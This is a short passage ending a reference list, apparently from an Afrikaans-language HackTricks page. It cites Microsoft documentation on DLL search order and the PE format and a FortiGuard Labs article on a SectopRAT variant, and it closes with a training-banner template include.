- [30] [Microsoft Learn – Soekvolgorde vir dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE-formaat](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Ontdekking van ’n SectopRAT-variant wat in wettige sagteware ingebed is](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
{{#include ../../../banners/hacktricks-training.md}}
